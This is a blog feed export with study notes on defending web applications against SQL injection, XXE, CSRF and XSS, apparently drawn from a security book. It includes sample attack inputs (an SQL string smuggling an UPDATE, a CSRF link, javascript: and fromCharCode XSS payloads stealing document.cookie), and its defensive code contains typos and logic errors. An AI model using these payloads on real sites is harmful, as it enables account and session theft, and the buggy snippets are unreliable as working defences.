(we<br>want name and barcode returned) that have a price less than ?.<br>First, we use the statement PREPARE to store our query under the name q. This query<br>will be compiled and ready for use. Next, we set a variable @price to 12. This would<br>be a good variable to have a user set if they were filtering against an ecommerce site,<br>for example. Then we EXCECUTE the query providing @price to fill the ? placeholder/<br>bind variable. Finally, we use DEALLOCATE on q to remove it from memory so its<br>namespace can be used for other things.<br>In this simple prepared statement, q is compiled prior to being executed with @price.<br>Even if @price was set equal to 5; UPDATE users WHERE id = 123 SET balance =<br>10000, the additional query would not fire as it would not be compiled by the data‐<br>base.<br>Oracle (Java) offers an encoder that can be invoked with the following syntax:<br>ESAPI.encoder().enodeForSQL(new OracleCodec(), str);<br>Similarly, MySQL offers equivalent functionality. In MySQL, the following can be<br>used to prevent the usage of improperly escaped strings:<br>SELECT QUOTE(‘test’’case’);<br>The QUOTE function in MySQL will escape backslashes, single quotes, or NULL, and<br>return a properly single-quoted string.<br>MySQL also offers mysql_real_escape_string(). This function escapes all of the<br>preceding backslashes and single quotes, but also escapes double quotes, \n, and \r<br>(linebreak).<br>Making use of database-specific string sanitizers for escaping risky character sets<br>reduces the SQL injection risk by making it harder to write an SQL literal versus a<br>string. These should always be used if a query is being run that cannot be paramater‐<br>ized—though they should not be considered a comprehensive defense but instead a<br>mitigation.</p><p>It extends across any type of script that takes text input and<br>interprets the text in some type of interpreter or evaluates the text against some list of<br>commands.</p><p>Typically, when on the lookout for injection, the following are high-risk targets:<br>• Task schedulers<br>• Compression/optimization libraries<br>• Remote backup scripts<br>• Databases<br>• Loggers<br>• Any call to the HOST OS<br>• Any interpreter or compiler<br>When first ranking components </p><blockquote></blockquote><p>The principle of least authority (often called principle of least privilege, which I believe<br>to be a bit less succinct) is an important abstraction rule that should always be used<br>when attempting to build secure web applications. The principle states that in any<br>system, each member of the system should only have access to the information and<br>resources required to accomplish their job</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;In most modern web applications, SQL operations would occur past the server-side&lt;br&gt;routing level. This means we aren’t too </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Defending Against XXE</title>
    <link href="http://example.com/2020/09/18/Defending%20Against%20XXE/"/>
    <id>http://example.com/2020/09/18/Defending%20Against%20XXE/</id>
    <published>2020-09-18T08:37:59.309Z</published>
    <updated>2020-09-20T01:38:06.867Z</updated>
    
    <content type="html"><![CDATA[<p>Generally speaking, XXE is indeed easy to defend against—simply disable external<br>entities in your XML parser (see Figure 24-1). How this is done depends on the XML<br>parser in question, but is typically just a single line of configuration:<br>factory.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;">http://apache.org/xml/features/disallow-doctype-decl&quot;</a>, true);</p><p>#XML versus JSON<br>Category| XML| JSON<br>—-| —-| —-<br>Payload size | Large |Compact<br>Specication complexity| High| Low<br>Ease of use| Requires complex parsing |Simple parsing for JavaScript compatibility<br>Metadata support| Yes| No<br>Rendering (via HTML-like structuring) |Easy |Difficult<br>Mixed content |Supported| Unsupported<br>Schema validation |Supported |Unsupported<br>Object mapping |None |JavaScript<br>Readability| Low |High<br>Comment support| Yes| No<br>Security| Lower| Higher</p><ul><li>JSON is a much more lightweight format than XML.</li><li>JSON offers less rigidity, but brings with it faster and easier to work withpayloads.</li><li>JSON maps to JavaScript objects, while XML more closely maps to DOM trees<br>(as the DOM is an XML-derived format).<blockquote><p>Because XML has schema validation, it may also be useful for applications where<br>deeply rigid data structure is required. JSON, on the other hand, is less rigid, making<br>it perfect for APIs with ongoing development such that the contract between the cli‐<br>ent and server does not need constant maintenance.<br>The security risks from XML mostly come from the power of its specification and the<br>fact that it can incorporate external files and multimedia. As such, it is naturally less<br>secure than JSON, a format that simply stores key/value pairs in a string-based<br>format.<br>If your organization does not like the idea of moving to JSON, YAML, BSON, or<br>EDN are all suitable alternatives but should require a similar analysis prior to<br>commitment.<br>#Advanced XXE Risks<br>It should be noted that XXE attacks often start as read-only attacks, but may progress<br>into more advanced forms of attack. XXE is a “gateway” attack of sorts as it provides<br>the attacker with a recon platform that permits them to access data otherwise unac‐<br>cessible to the world outside of the web server.<br>Using this data, other parts of the application may be more easily compromised. The<br>result is that the final impact of an XXE attack can be anywhere from read-only data<br>access to remote code execution and full server takeovers. This is why XXE attacks<br>are so incredibly dangerous</p></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Generally speaking, XXE is indeed easy to defend against—simply disable external&lt;br&gt;entities in your XML parser (see Figure 24-1). How th</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Defending Against CSRF</title>
    <link href="http://example.com/2020/09/18/Defending%20Against%20CSRF%20Attacks/"/>
    <id>http://example.com/2020/09/18/Defending%20Against%20CSRF%20Attacks/</id>
    <published>2020-09-18T01:38:28.065Z</published>
    <updated>2020-09-20T01:39:16.691Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>In Part II we built Cross-Site Request Forgery (CSRF) attacks that took advantage of a<br>user’s authenticated session in order to make requests on their behalf. We built CSRF<br>attacks with <a></a> links, via <img></img> tags, and even via HTTP POST using<br>web forms. We saw how effective and dangerous CSRF-style attacks are against an<br>application, because they function at both an elevated privilege level and often are<br>undetectable by the authenticated user.</p></blockquote><p>##Header Verification<br>checking the origin of the request<br>in the world of HTTP– two headers we are inerested in–<strong><em>referer and origin</em></strong><br>== they cannot be modified programmatically with js in all major browsers.</p><p><strong><em>Origin header</em></strong><br>    The origin header is only sent on HTTP POST requests. indicates where a request originated from. also present on HTTP requests, in addition to HTTP requests. An origin header looks like:<br>    <strong><em>Origin: <a href="https://www.mega-bank.com:80/">https://www.mega-bank.com:80</a></em></strong></p><p>Referer header<br>  The referer header is set on all requests, and also indicates where a request originated from. when referering link has the attribute <strong><em>rel=noreferer</em></strong> set.A referer header looks like: Referer:<a href="https://www.mega-bank.com:80/">https://www.mega-bank.com:80</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> transferFunds = <span class="built_in">require</span>(<span class="string">&#x27;../operations/transferFunds&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;../util/session&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> validLocations = [</span><br><span class="line">    <span class="string">&#x27;https://www.mega-bank.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https://api.mega-bank.com&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> validateHeadersAgainstCSRF = <span class="function"><span class="keyword">function</span>(<span class="params">headers</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> origin = headers.origin</span><br><span class="line">    <span class="keyword">const</span> referer = headers.referer</span><br><span class="line">    <span class="keyword">if</span> (!origin || referer) &#123; <span class="keyword">return</span> <span class="literal">false</span> &#125;</span><br><span class="line">    <span class="keyword">if</span> (!validLocations.includes(origin) || </span><br><span class="line">        !validLocations.includes(referer))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> ture</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cosnt transfer = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!session.isAuthenticated)&#123; <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span> (!validateHeadersAgainstCSRF(req, headers)&#123; <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> transferFunds(session.currentUser, req.query.to_user, req.quer.amount)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = transfer</span><br></pre></td></tr></table></figure><blockquote><p>check both headers == referer origin<br>first line of defense<br>Should<br>an attacker get an XSS on a whitelisted origin of yours, they can initiate the attack<br>from your own origin, appearing to come from your own servers as a legitimate<br>request.</p></blockquote><p>#CSRF Tokens<br>anti-CSRF token<br>At its core, CSRF token defense works like this:</p><ol><li>Your web server sends a special token to the client. This token is generated cryp‐<br>tographically with a very low collision algorithm, which means that the odds of<br>getting two identical tokens are exceedingly rare. The token can be regenerated<br>as often as per request, but generally is generated per session.</li><li>Each request from your web application now sends the token back with it; this<br>should be sent back in forms as well as AJAX requests. When the request gets to<br>the server, the token is verified to make sure it is live (not expired), authentic,<br>and has not been manipulated. If verification fails, the request is logged and fails<br>as well.<br>CSRF Tokens | 249</li><li>As a result of requests requiring a valid CSRF token, which is unique per session<br>and unique to each user, CSRF attacks originating from other origins become<br>extremely difficult to pull off. Not only would the attacker need a live and up-todate CSRF token, but they would also now need to target a specific user versus a<br>large number of users. Furthermore, with token expiration compromised, CSRF<br>tokens can be dead by the time a user clicks a malicious link—a beneficial side<br>effect of CSRF tokens as a defensive strategy.</li></ol><p>#stateless CSRF Tokens</p><p>Much like stateless authentication tokens, a stateless CSRF token should consist of the<br>following:<br>• A unique identifier of the user the token belongs to<br>• A timestamp (which can be used for expiration)<br>• A cryptographic nonce whose key only exists on the server<br>Combining these elements nets you a CSRF token that is not only practical but also<br>consumes fewer server resources than the stateful alternative, as managing sessions<br>does not scale well compared to a sessionless alternative.</p><p>#Anti-CSRF Coding  Best Pratices<br>Several of the most effective methods are:</p><ul><li>Refactoring to stateless GET requests</li><li>Implementation of application-wide CSRF defenses</li><li>Introduction of request-checking middleware</li></ul><p>#Stateless GET Requests</p><blockquote><p>Because the most common and easily distributable CSRF attacks come via HTTP<br>GET requests, it is important to correctly structure our API calls to mitigate this risk.<br>HTTP GET requests should not store or modify any server-side state. Doing so leaves<br>future GET requests or modifications to GET requests open to potential CSRF<br>vulnerabilities.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GET</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">getUserById(req.query.id).then(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (req.query.updates) &#123; user.update(req.updates); &#125;</span><br><span class="line"> <span class="keyword">return</span> res.json(user);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// GET</span></span><br><span class="line"><span class="keyword">const</span> getUser = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">getUserById(req.query.id).then(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> res.json(user);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// POST</span></span><br><span class="line"><span class="keyword">const</span> updateUser = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> getUserById(req.query.id).then(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line"> user.update(req.updates).then(<span class="function">(<span class="params">updated</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (!updated) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>); &#125;</span><br><span class="line"> <span class="keyword">return</span> res.sendStatus(<span class="number">200</span>);</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>The first API combines the two operations into a single request, with an optional<br>update. The second API splits retrieving and updating users into a GET and POST<br>request, respectively.<br>The first API can be taken advantage of by CSRF in any HTTP GET (e.g., a link or<br>image: https://<url>/user?user=123&amp;updates=email:hacker). The second API,<br>while still an HTTP POST and potentially vulnerable to more advanced CSRF, cannot<br>be taken advantage of by links, images, or other HTTP GET-style CSRF attacks.<br>This seems like a simple architecture flaw (modifying state in HTTP GET requests),<br>and in all honesty it is. But the key point here applies to any and all GET requests that<br>could potentially modify server-side application state—don’t do it. HTTP GET<br>requests are at risk by default; the nature of the web makes them much more vulnera‐<br>ble to CSRF attacks, and you should avoid them for stateful operations.<br>#Application-Wide CSRF Mitigation</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Let’s take a look at some middleware that accomplishes just <span class="built_in">this</span>:</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;../util/crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> dateTime = <span class="built_in">require</span>(<span class="string">&#x27;../util/dateTime&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;../util/session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;../util/logger&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> validLocations = [</span><br><span class="line"><span class="string">&#x27;https://www.mega-bank.com&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://api.mega-bank.com&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://portal.mega-bank.com&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> validateHeaders = <span class="function"><span class="keyword">function</span>(<span class="params">headers, method</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> origin = headers.origin;</span><br><span class="line"> <span class="keyword">const</span> referer = headers.referer;</span><br><span class="line"> <span class="keyword">let</span> isValid = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">if</span> (method === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"> isValid = validLocations.includes(referer) &amp;&amp; validLocations.includes(origin);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> isValid = validLocations.includes(referer);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> isValid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> validateCSRFToken = <span class="function"><span class="keyword">function</span>(<span class="params">token, user</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// get data from CSRF token</span></span><br><span class="line"> <span class="keyword">const</span> text_token = crypto.decrypt(token);</span><br><span class="line"> <span class="keyword">const</span> user_id = text_token.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"> <span class="keyword">const</span> date = text_token.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"> <span class="keyword">const</span> nonce = text_token.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">2</span>];</span><br><span class="line"> <span class="comment">// check validity of data</span></span><br><span class="line"> <span class="keyword">let</span> validUser = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">let</span> validDate = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">let</span> validNonce = <span class="literal">false</span>;</span><br><span class="line"><span class="number">252</span> | Chapter <span class="number">23</span>: Defending Against CSRF Attacks</span><br><span class="line"> <span class="keyword">if</span> (user_id === user.id) &#123; validUser = <span class="literal">true</span>; &#125;</span><br><span class="line"> <span class="keyword">if</span> (dateTime.lessThan(<span class="number">1</span>, <span class="string">&#x27;week&#x27;</span>, date)) &#123; validDate = <span class="literal">true</span>; &#125;</span><br><span class="line"> <span class="keyword">if</span> (crypto.validateNonce(user_id, date, nonce)) &#123; validNonce = <span class="literal">true</span>; &#125;</span><br><span class="line"> <span class="keyword">return</span> validUser &amp;&amp; validDate &amp;&amp; validNonce;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> CSRFShield = <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!validateHeaders(req.headers, req.method) ||</span><br><span class="line"> !validateCSRFToken(req.csrf, session.currentUser) &#123;</span><br><span class="line"> logger.log(req);</span><br><span class="line"> <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> next();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>The middleware simply verifies that the origin<br>and/or referrer headers are correct, and then ensures that the CSRF token is valid. It<br>returns an error before any other logic is called if either fail; otherwise it moves on to<br>the next middleware and allows the application to continue execution unaltered.<br>Because this middleware relies on a client consistently passing a CSRF token to the<br>server on each request, it would be optimal to replicate such automation on the client<br>as well. This can be done with a number of techniques. For example, you could use<br>the proxy pattern to overwrite the XMLHttpRequest default behavior to always include<br>the token.<br>Alternatively, you could use a more simple approach that would rely on building a<br>library for generating requests that would simply wrap the XMLHttpRequest and<br>inject the correct token, depending on the HTTP verb.<br>#Summary<br> Further, CSRF mitigations should consider<br>validating headers and adding CSRF tokens to each of your requests.</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;In Part II we built Cross-Site Request Forgery (CSRF) attacks that took advantage of a&lt;br&gt;user’s authenticated session in or</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Defending Against XXS</title>
    <link href="http://example.com/2020/09/17/Defending%20Against%20XSS/"/>
    <id>http://example.com/2020/09/17/Defending%20Against%20XSS/</id>
    <published>2020-09-17T11:10:15.752Z</published>
    <updated>2020-09-20T01:38:31.638Z</updated>
    
    <content type="html"><![CDATA[<p>#Anti-XSS Coding Best Practices<br>**<em>Dont’ allow any user-supplied data to be passwd into the DOM-except as strings**</em></p><blockquote><p>Such a rule is not applicable to all applications, as many applications have features<br>that incorporate users to DOM data transfer. In this case, we can make this rule more<br>specific: “never allow any unsanitized user-supplied data to be passed into the DOM.”</p></blockquote><p>perfrom checks a number of ways on both the client and the server.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>  isString = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x === <span class="string">&#x27;string&#x27;</span> || x <span class="keyword">instanceof</span> <span class="built_in">String</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>unfortunately, this check will fail when checking numbers–an edge case that can be annoying to deal with beacause numbers are also safe fro injection into the DOM.</p></blockquote><p>***We can categorize strings and numbers into “string-like” objects. evaluate a “string-like” obj using a relatively unknown side effect of JSON.parse():</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isStringLike = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(<span class="built_in">JSON</span>.parse(x)) === x;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;not string-like&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong><em>JSON.parse()</em></strong> — built into js — attempts to convert text to JSON object. Numbers and strings will pass the check, but complex objects such as fucntions will fail as they do not fit a format compatible with JSON</p></blockquote><p>Finally, we must ensure that even when we have a string object or string-like object,<br>the DOM interprets it as string/string-like. This is because string objects, while not<br>DOM themselves, can still be interpreted as DOM or converted into DOM, which we<br>want to avoid.</p><blockquote><p>Generally, we inject user data into the DOM using innerText or innerHTML. When<br>HTML tags are not needed, innerText is much safer because it attempts to sanitize<br>anything that looks like an HTML tag by representing it as a string<br>####Less safe:</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userString = <span class="string">&#x27;&lt;strong&gt;cakeit&lt;/strong&gt;;</span></span><br><span class="line">const div = document.querySelector(&#x27;#userComment&#x27;)</span><br><span class="line">div.innerHTML = userString <span class="comment">// tags interpreted as DOM</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userString = <span class="string">&#x27;&lt;strong&gt;cakeit&lt;/strong&gt;;</span></span><br><span class="line">const div = document.querySelector(&#x27;#userComment&#x27;)</span><br><span class="line">div.innerText = userString; <span class="comment">// tags interpreted as  strings </span></span><br></pre></td></tr></table></figure><blockquote><p>This is because innerText performs its<br>own sanitization in order to view HTML tags as strings, whereas innerHTML does not<br>perform such sanitization and will interpret HTML tags as HTML tags when loaded<br>into the DOM. The sanitized innerText is not failsafe, as each browser has its own<br>variations on the exact implementation, and with a quick internet search you can find<br>a variety of current and historical ways to bypass the sanitization<br>#Sanitizing User Input<br>Sometimes you will not be able to rely on a useful tool like innerText to aid you in<br>sanitizing user input. This is particularly common when you need to allow certain<br>HTML tags, but not others</p></blockquote><hr><p>+For example, you may want to allow <strong><strong><br>and <i></i> but not <script></script>. In these cases, you want to make sure you<br>extensively sanitize the user-submitted data prior to injecting it into the DOM<br>===============================</p><p>For example, let’s assume your sanitizer blocks single and double quotes as well as<br>script tags. You could still run into this issue:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>&gt;</span>clck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Using this method with other DOM methods, you can even bypass the filtration on<br>single and double quote:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>would alert “XSS” as the string has been derived rom the <strong><em>String.fromCharCode() API</em></strong></p></blockquote><p>Stay away from the following APIs when possible:</p><ul><li>element.innerHTM<code>L / </code>element.outerHTML</li><li>Blob</li><li>SVG</li><li>document.write / document.writeln</li><li>DOMParser.parseFromString</li><li>document.implementation<br>#DOMParser Sink<br>allow develop to easily generate DOM or script from text<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line"><span class="keyword">const</span> html = parser.parseFromString(<span class="string">&#x27;&lt;script&gt;alert(&quot;hi&quot;);&lt;/script&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>This API loads the cotents of the string in <strong><em>parseFromString</em></strong> into DOM nodes reflecting the structure of the input string.This could be used for filling a page with<br>structured DOM from a server, which may be beneficial when you want to turn a<br>complex DOM string into properly organized DOM nodes.</p></blockquote></li></ul><p>However, manually creating each node with document.createElement() and organ‐<br>izing them using document.appendChild(child) offers significantly less risk. You<br>now are controlling the structure and tag names of the DOM while the payload only<br>controls the content.<br>###SVG Sink<br>sinificant risk— store arbitrary data and yet still are capable of code execution:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://www.w3.org/Graphics/SBG/1.1/DTD/sbg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;258&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;250&quot;</span> <span class="attr">r</span>=<span class="string">&quot;50&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>):</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Scalable Vecotr Graphics — SVG– wonderful for displaying images consisitently across a wide number of devices— reliance on the XML spec that allow script execution, they are much riskier </p><blockquote><p>We saw in Part II that we could use the image tag <img> to launch CSRF attacks since<br>the <img> tag supports a href. SVGs can launch any type of JavaScript onload, making<br>them significantly more dangerous.<br>####Blob Sink</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create blob with script reference </span></span><br><span class="line"><span class="keyword">const</span> blog = <span class="keyword">new</span> Blob([script], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/javascript&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">const</span> url = URL.creteObjectURL(blob)</span><br><span class="line"><span class="comment">// inject script into page for execution</span></span><br><span class="line"><span class="keyword">const</span> script  = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">script.src = url</span><br><span class="line"></span><br><span class="line"><span class="comment">// load the script into the page </span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script)</span><br></pre></td></tr></table></figure><p>Furthermore, blobs can store data in many formats; base64 as a blob is simply a con‐<br>tainer for arbitrary data. As a result, it is best to leave blobs out of your code if possi‐<br>ble, especially if any of the blob instantiation process involves user data.<br>####Sanitizing Hyperlinks</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;goToLink()&quot;</span>&gt;click me&lt;/button&gt;</span><br><span class="line"><span class="keyword">const</span> userLink = <span class="string">&quot;&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> goToLink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="built_in">window</span>.location.href = <span class="string">`https://mywebsite.com/<span class="subst">$&#123;userLink&#125;</span>`</span>;</span><br><span class="line"> <span class="comment">// goes to: https://my-website.com/&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td 